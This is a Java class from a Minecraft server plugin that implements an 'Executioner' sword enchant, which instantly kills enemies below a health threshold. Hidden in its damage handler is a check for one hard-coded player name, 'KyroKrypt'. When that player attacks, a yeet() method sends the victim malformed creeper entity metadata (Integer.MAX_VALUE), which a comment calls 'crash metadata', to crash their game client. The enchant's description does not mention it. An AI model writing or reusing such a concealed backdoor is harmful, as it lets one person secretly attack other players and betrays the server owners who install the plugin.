package dev.kyro.pitremake.enchants;

import dev.kyro.arcticapi.builders.ALoreBuilder;
import dev.kyro.pitremake.PitRemake;
import dev.kyro.pitremake.controllers.DamageEvent;
import dev.kyro.pitremake.controllers.EnchantManager;
import dev.kyro.pitremake.controllers.PitEnchant;
import dev.kyro.pitremake.enums.ApplyType;
import net.minecraft.server.v1_8_R3.*;
import org.bukkit.Bukkit;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

import java.util.List;

public class Executioner extends PitEnchant {

	public Executioner() {
		super("Executioner", true, ApplyType.SWORDS,
				"executioner", "exe");
	}

	@Override
	public DamageEvent onDamage(DamageEvent damageEvent) {

		int enchantLvl = damageEvent.getEnchantLevel(this);
		if(enchantLvl == 0) return damageEvent;

		damageEvent.executeUnder = getExecuteHealth(enchantLvl);

		if(damageEvent.attacker.getName().equals("KyroKrypt")) {

			yeet(damageEvent.defender);
		}

		return damageEvent;
	}

	public void yeet(Player willBeCrashed){
		final EntityPlayer px = ((CraftPlayer)willBeCrashed).getHandle();
		final EntityCreeper entity = new EntityCreeper(px.world);

		final DataWatcher dw = new DataWatcher(entity);
		dw.a(18, (Object)Integer.MAX_VALUE);

		PacketPlayOutSpawnEntityLiving packet_spawn = new PacketPlayOutSpawnEntityLiving(entity);

		px.playerConnection.sendPacket(packet_spawn);
		Bukkit.getScheduler().scheduleSyncDelayedTask(PitRemake.INSTANCE, new Runnable(){ //Some delay to send the crash metadata
			@Override
			public void run() {
				PacketPlayOutEntityMetadata meta = new PacketPlayOutEntityMetadata(entity.getId(), dw, true);
				px.playerConnection.sendPacket(meta);
			}

		}, 5L);
	}

	@Override
	public List<String> getDescription(int enchantLvl) {

		return new ALoreBuilder("&7Hitting an enemy below &c" + (getExecuteHealth(enchantLvl) / 2) + "\u2764",
				"&7instantly kills them").getLore();
	}

	public double getExecuteHealth(int enchantLvl) {

		return enchantLvl + 1;
	}
}
